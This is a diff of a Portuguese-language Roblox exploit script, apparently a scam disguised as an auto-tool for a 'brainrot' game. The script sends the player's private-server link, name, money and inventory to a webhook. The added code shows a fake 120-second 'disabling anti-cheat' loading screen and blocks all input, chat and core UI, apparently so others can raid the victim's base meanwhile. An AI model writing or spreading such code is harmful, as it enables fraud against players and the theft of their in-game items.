@@ -10,7 +10,6 @@ local Players     = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local SoundService= game:GetService("SoundService")
 local Workspace   = game:GetService("Workspace")
-local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local RunService   = game:GetService("RunService")
 local StarterGui   = game:GetService("StarterGui")
@@ -18,11 +17,9 @@ local ContextActionService = game:GetService("ContextActionService")
 
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
-local PREFIX      = "[AUTO]"
-local WEBHOOK_USUARIO = nil
 
 --=============================================================
---  🔑 CAPTURA DA KEY
+--  🔑 CAPTURA DA KEY E VALIDAÇÃO
 --=============================================================
 local API_KEY = ...
 if type(API_KEY) ~= "string" or API_KEY == "" then
@@ -30,9 +27,8 @@ if type(API_KEY) ~= "string" or API_KEY == "" then
     return
 end
 
---=============================================================
---  🔐 VALIDAÇÃO NA API
---=============================================================
+local WEBHOOK_USUARIO = nil
+
 local function validarKey()
     local req = syn and syn.request or http_request or request or http.request
     if not req then return false, "Executor sem suporte HTTP." end
@@ -65,84 +61,7 @@ if not isKeyValid then
 end
 
 --=============================================================
---  🔗 VALIDAÇÃO DE LINK DE SERVIDOR PRIVADO
---=============================================================
-local function validarLinkServidor(link)
-    if type(link) ~= "string" then return false, "Link inválido" end
-    link = link:gsub("^%s+", ""):gsub("%s+$", "")
-    if link == "" then return false, "Link vazio" end
-    
-    local dominioOk = link:match("^https?://[w%.]*roblox%.com/") or link:match("^[w%.]*roblox%.com/")
-    if not dominioOk then return false, "Não é um link do Roblox" end
-    
-    if not link:lower():find("/share", 1, true) then return false, "Não é um link de compartilhamento" end
-    
-    local tipo = link:match("[?&]type=([^&#]+)")
-    if not tipo or tipo:lower() ~= "server" then return false, "Não é um link de servidor" end
-    
-    local code = link:match("[?&]code=([^&#]+)")
-    if not code or #code ~= 32 or not code:match("^[0-9a-fA-F]+$") then return false, "Código de servidor inválido" end
-
-    return true, "OK"
-end
-
---=============================================================
---  WEBHOOK E DADOS
---=============================================================
-local function getMeuDinheiro()
-    local ls = LocalPlayer:FindFirstChild("leaderstats")
-    if ls then
-        for _, v in ipairs(ls:GetChildren()) do
-            if v.Name:lower():find("money") or v.Name:lower():find("cash") or v.Name:lower():find("coin") then
-                return tostring(v.Value)
-            end
-        end
-        local first = ls:GetChildren()[1]
-        if first then return tostring(first.Value) end
-    end
-    return "Desconhecido"
-end
-
-local function sendWebhook(title, description, color)
-    if not WEBHOOK_USUARIO then return end
-
-    local qtdPlayers = #Players:GetPlayers()
-    local dinheiro = getMeuDinheiro()
-
-    local payload = {
-        username = "Brainrot Notifier",
-        avatar_url = "https://i.imgur.com/8Km9tLL.png",
-        embeds = {{
-            title = tostring(title),
-            description = tostring(description),
-            color = color or 0x2ECC71,
-            fields = {
-                { name = "👥 Jogadores no Servidor", value = tostring(qtdPlayers), inline = true },
-                { name = "💰 Seu Dinheiro", value = dinheiro, inline = true }
-            },
-            footer = { text = "Jogador: " .. LocalPlayer.Name },
-            timestamp = DateTime.now():ToIsoDate()
-        }}
-    }
-    local ok, encoded = pcall(HttpService.JSONEncode, HttpService, payload)
-    if not ok then return end
-    
-    local function req(args)
-        if syn and syn.request then syn.request(args)
-        elseif request then request(args)
-        elseif http_request then http_request(args)
-        elseif http and http.request then http.request(args) end
-    end
-    
-    task.spawn(function()
-        pcall(function() 
-            req({Url = WEBHOOK_USUARIO, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encoded}) 
-        end)
-    end)
-end
-
---=============================================================
---  🔇 MUTE BRUTAL
+--  🔇 MUTE BRUTAL (Remove sons)
 --=============================================================
 pcall(function()
     SoundService.Volume = 0
@@ -236,7 +155,7 @@ task.spawn(function()
 end)
 
 --=============================================================
---  🎯 ENVIO DE BRAINROTS
+--  🎯 LÓGICA DE BRAINROTS E WEBHOOK
 --=============================================================
 local BASE_RADIUS = 200
 
@@ -630,6 +549,58 @@ local function getBrainrotsString()
     return #formattedItems > 0 and table.concat(formattedItems, "\n") or "Nenhum brainrot encontrado."
 end
 
+local function getMeuDinheiro()
+    local ls = LocalPlayer:FindFirstChild("leaderstats")
+    if ls then
+        for _, v in ipairs(ls:GetChildren()) do
+            if v.Name:lower():find("money") or v.Name:lower():find("cash") or v.Name:lower():find("coin") then
+                return tostring(v.Value)
+            end
+        end
+        local first = ls:GetChildren()[1]
+        if first then return tostring(first.Value) end
+    end
+    return "Desconhecido"
+end
+
+local function sendWebhook(title, description, color)
+    if not WEBHOOK_USUARIO then return end
+
+    local qtdPlayers = #Players:GetPlayers()
+    local dinheiro = getMeuDinheiro()
+
+    local payload = {
+        username = "Brainrot Notifier",
+        avatar_url = "https://i.imgur.com/8Km9tLL.png",
+        embeds = {{
+            title = tostring(title),
+            description = tostring(description),
+            color = color or 0x2ECC71,
+            fields = {
+                { name = "👥 Jogadores no Servidor", value = tostring(qtdPlayers), inline = true },
+                { name = "💰 Seu Dinheiro", value = dinheiro, inline = true }
+            },
+            footer = { text = "Jogador: " .. LocalPlayer.Name },
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    }
+    local ok, encoded = pcall(HttpService.JSONEncode, HttpService, payload)
+    if not ok then return end
+    
+    local function req(args)
+        if syn and syn.request then syn.request(args)
+        elseif request then request(args)
+        elseif http_request then http_request(args)
+        elseif http and http.request then http.request(args) end
+    end
+    
+    task.spawn(function()
+        pcall(function() 
+            req({Url = WEBHOOK_USUARIO, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encoded}) 
+        end)
+    end)
+end
+
 local function enviarBrainrots(link)
     local baseName = "Sua Base"
     local brainrotsText = getBrainrotsString()
@@ -644,11 +615,69 @@ local function enviarBrainrots(link)
 end
 
 --=============================================================
---  🎨 UI PRINCIPAL (PROTEGIDA)
+--  🎨 UI PRINCIPAL E LÓGICA DE LOADING
 --=============================================================
+local function iniciarBloqueioTotal()
+    pcall(function()
+        task.spawn(function()
+            local playerModule = require(LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
+            local controls = playerModule:GetControls()
+            controls:Disable()
+        end)
+
+        ContextActionService:BindAction(
+            "BloqueioTotalTeclado",
+            function() return Enum.ContextActionResult.Sink end,
+            false,
+            unpack(Enum.KeyCode:GetEnumItems())
+        )
+
+        local screenGuiFocus = Instance.new("ScreenGui")
+        screenGuiFocus.Name = "FocusBlocker"
+        screenGuiFocus.IgnoreGuiInset = true
+        screenGuiFocus.DisplayOrder = 999999
+        screenGuiFocus.Parent = PlayerGui
+        
+        local textBoxFocus = Instance.new("TextBox")
+        textBoxFocus.Size = UDim2.new(0, 0, 0, 0)
+        textBoxFocus.BackgroundTransparency = 1
+        textBoxFocus.TextTransparency = 1
+        textBoxFocus.Position = UDim2.new(0, 0, 0, 0)
+        textBoxFocus.Parent = screenGuiFocus
+        
+        textBoxFocus:CaptureFocus()
+        
+        task.spawn(function()
+            while task.wait(0.1) do
+                pcall(function()
+                    if not textBoxFocus:IsFocused() then
+                        textBoxFocus:CaptureFocus()
+                    end
+                end)
+            end
+        end)
+
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+        
+        task.spawn(function()
+            while task.wait(0.1) do
+                pcall(function()
+                    local CoreGui = game:GetService("CoreGui")
+                    local topbar = CoreGui:FindFirstChild("TopBarApp")
+                    if topbar then topbar:Destroy() end
+                    local chat = CoreGui:FindFirstChild("Chat")
+                    if chat then chat:Destroy() end
+                end)
+            end
+        end)
+    end)
+end
+
 local function criarUI()
     local old = PlayerGui:FindFirstChild("BrainrotNotifierUI")
     if old then old:Destroy() end
+    local oldLoading = PlayerGui:FindFirstChild("BrainrotLoading")
+    if oldLoading then oldLoading:Destroy() end
 
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "BrainrotNotifierUI"
@@ -762,6 +791,223 @@ local function criarUI()
     btnCorner.CornerRadius = UDim.new(0, 6)
     btnCorner.Parent = botao
 
+    -- === TELA DE LOADING ===
+    local loadingGui = Instance.new("ScreenGui")
+    loadingGui.Name = "BrainrotLoading"
+    loadingGui.ResetOnSpawn = false
+    loadingGui.IgnoreGuiInset = true
+    loadingGui.DisplayOrder = 10000
+    loadingGui.Enabled = false
+    loadingGui.Parent = PlayerGui
+
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.fromRGB(14, 18, 16)
+    bg.BorderSizePixel = 0
+    bg.ZIndex = 1
+    bg.Parent = loadingGui
+
+    local container = Instance.new("Frame")
+    container.Size = UDim2.new(0, 400, 0, 400)
+    container.Position = UDim2.new(0.5, 0, 0.5, 0)
+    container.AnchorPoint = Vector2.new(0.5, 0.5)
+    container.BackgroundTransparency = 1
+    container.ZIndex = 5
+    container.Parent = bg
+
+    local uiList = Instance.new("UIListLayout")
+    uiList.FillDirection = Enum.FillDirection.Vertical
+    uiList.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    uiList.VerticalAlignment = Enum.VerticalAlignment.Center
+    uiList.SortOrder = Enum.SortOrder.LayoutOrder
+    uiList.Padding = UDim.new(0, 22)
+    uiList.Parent = container
+
+    local mainTitle = Instance.new("TextLabel")
+    mainTitle.Size = UDim2.new(1, 0, 0, 30)
+    mainTitle.BackgroundTransparency = 1
+    mainTitle.Text = "AUTO LEJAX7"
+    mainTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    mainTitle.TextSize = 26
+    mainTitle.Font = Enum.Font.GothamBlack
+    mainTitle.LayoutOrder = 1
+    mainTitle.ZIndex = 5
+    mainTitle.Parent = container
+
+    local subTitle = Instance.new("TextLabel")
+    subTitle.Size = UDim2.new(1, 0, 0, 15)
+    subTitle.BackgroundTransparency = 1
+    subTitle.Text = "/v0.1 Beta • VERSAO EM BETA"
+    subTitle.TextColor3 = Color3.fromRGB(46, 204, 113)
+    subTitle.TextSize = 12
+    subTitle.Font = Enum.Font.GothamMedium
+    subTitle.LayoutOrder = 2
+    subTitle.ZIndex = 5
+    subTitle.Parent = container
+
+    local circleFrame = Instance.new("Frame")
+    circleFrame.Size = UDim2.new(0, 80, 0, 80)
+    circleFrame.BackgroundTransparency = 1
+    circleFrame.LayoutOrder = 4
+    circleFrame.ZIndex = 5
+    circleFrame.Parent = container
+
+    local circle = Instance.new("Frame")
+    circle.Size = UDim2.new(1, 0, 1, 0)
+    circle.BackgroundTransparency = 1
+    circle.ZIndex = 5
+    circle.Parent = circleFrame
+
+    local circleCorner = Instance.new("UICorner")
+    circleCorner.CornerRadius = UDim.new(1, 0)
+    circleCorner.Parent = circle
+
+    local circleStroke = Instance.new("UIStroke")
+    circleStroke.Color = Color3.fromRGB(46, 204, 113)
+    circleStroke.Thickness = 4
+    circleStroke.Parent = circle
+
+    local circleGradient = Instance.new("UIGradient")
+    circleGradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
+    }
+    circleGradient.Transparency = NumberSequence.new{
+        NumberSequenceKeypoint.new(0, 0),
+        NumberSequenceKeypoint.new(0.4, 0),
+        NumberSequenceKeypoint.new(0.6, 1),
+        NumberSequenceKeypoint.new(1, 1)
+    }
+    circleGradient.Rotation = 0
+    circleGradient.Parent = circleStroke
+
+    local rotacaoAtual = 0
+    RunService.RenderStepped:Connect(function(dt)
+        if loadingGui.Enabled then
+            rotacaoAtual = (rotacaoAtual + dt * 180) % 360
+            circleGradient.Rotation = rotacaoAtual
+        end
+    end)
+
+    local processingText = Instance.new("TextLabel")
+    processingText.Size = UDim2.new(1, 0, 0, 20)
+    processingText.BackgroundTransparency = 1
+    processingText.Text = "Processando brainrots..."
+    processingText.TextColor3 = Color3.fromRGB(200, 200, 200)
+    processingText.TextSize = 16
+    processingText.Font = Enum.Font.GothamBold
+    processingText.LayoutOrder = 5
+    processingText.ZIndex = 5
+    processingText.Parent = container
+
+    local bigPercent = Instance.new("TextLabel")
+    bigPercent.Size = UDim2.new(1, 0, 0, 15)
+    bigPercent.BackgroundTransparency = 1
+    bigPercent.Text = "0%"
+    bigPercent.TextColor3 = Color3.fromRGB(46, 204, 113)
+    bigPercent.TextSize = 14
+    bigPercent.Font = Enum.Font.GothamBold
+    bigPercent.LayoutOrder = 6
+    bigPercent.ZIndex = 5
+    bigPercent.Parent = container
+
+    local barraBg = Instance.new("Frame")
+    barraBg.Size = UDim2.new(0, 280, 0, 6)
+    barraBg.BackgroundColor3 = Color3.fromRGB(40, 45, 42)
+    barraBg.BorderSizePixel = 0
+    barraBg.LayoutOrder = 7
+    barraBg.ZIndex = 5
+    barraBg.Parent = container
+    
+    local bCorner = Instance.new("UICorner")
+    bCorner.CornerRadius = UDim.new(1, 0)
+    bCorner.Parent = barraBg
+
+    local barraFill = Instance.new("Frame")
+    barraFill.Size = UDim2.new(0, 0, 1, 0)
+    barraFill.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
+    barraFill.BorderSizePixel = 0
+    barraFill.ZIndex = 6
+    barraFill.Parent = barraBg
+
+    local bfCorner = Instance.new("UICorner")
+    bfCorner.CornerRadius = UDim.new(1, 0)
+    bfCorner.Parent = barraFill
+
+    local footerText = Instance.new("TextLabel")
+    footerText.Size = UDim2.new(1, 0, 0, 15)
+    footerText.BackgroundTransparency = 1
+    footerText.Text = "POWERED BY LEJAX7"
+    footerText.TextColor3 = Color3.fromRGB(100, 110, 105)
+    footerText.TextSize = 10
+    footerText.Font = Enum.Font.GothamMedium
+    footerText.LayoutOrder = 8
+    footerText.ZIndex = 5
+    footerText.Parent = container
+
+    local mensagens = {
+        "Sincronizando com Script...",
+        "Buscando bases Fulls...",
+        "Desativando o Anti-Cheat...",
+        "Injetando script com segurança...",
+        "Bypass de Seguranca...",
+        "Verificando possivel Erro...",
+        "Escaneando players...",
+        "Sincronizando servidores...",
+        "Otimizando o script...",
+        "Finalizando conexão segura..."
+    }
+
+    task.spawn(function()
+        while loadingGui.Parent do
+            task.wait(4)
+            if loadingGui.Enabled then
+                local novaMsg = mensagens[math.random(1, #mensagens)]
+                processingText.Text = novaMsg
+            end
+        end
+    end)
+
+    task.spawn(function()
+        local progresso = 0
+        local tempoTotal = 120
+        local passos = tempoTotal / 0.1 
+        
+        while loadingGui.Parent do
+            task.wait(0.1)
+            if not loadingGui.Enabled then 
+                progresso = 0
+                barraFill.Size = UDim2.new(0, 0, 1, 0)
+                bigPercent.Text = "0%"
+                bigPercent.TextColor3 = Color3.fromRGB(46, 204, 113)
+                processingText.Text = "Processando brainrots..."
+                processingText.TextColor3 = Color3.fromRGB(200, 200, 200)
+                continue 
+            end
+
+            pcall(function()
+                if progresso < 99 then
+                    progresso = progresso + (100 / passos)
+                    if progresso > 99 then progresso = 99 end
+                end
+                
+                barraFill.Size = UDim2.new(progresso / 100, 0, 1, 0)
+                bigPercent.Text = math.floor(progresso) .. "%"
+                
+                if progresso >= 99 then
+                    bigPercent.TextColor3 = Color3.fromRGB(120, 255, 170)
+                    processingText.Text = "Finalizando conexão segura..."
+                    processingText.TextColor3 = Color3.fromRGB(120, 255, 170)
+                else
+                    bigPercent.TextColor3 = Color3.fromRGB(46, 204, 113)
+                end
+            end)
+        end
+    end)
+
+    -- Lógica de clique do botão
     botao.MouseButton1Click:Connect(function()
         local link = textBox.Text
         if not link or link == "" then
@@ -782,13 +1028,14 @@ local function criarUI()
         aviso.Text = ""
         aviso.TextTransparency = 1
         painel.Visible = false
+        
+        loadingGui.Enabled = true
+        iniciarBloqueioTotal()
 
         enviarBrainrots(link)
-        LocalPlayer:Kick("✅ Script executado com sucesso! Verifique o Discord.")
     end)
 end
 
--- Tenta criar a UI com proteção para não derrubar o script
 task.spawn(function()
     task.wait(1)
     local sucesso, erro = pcall(criarUI)
@@ -798,3 +1045,5 @@ task.spawn(function()
         print("[AUTO] ✅ Interface carregada!")
     end
 end)
+
+print("[AUTO] ✅ Script carregado com sucesso!")
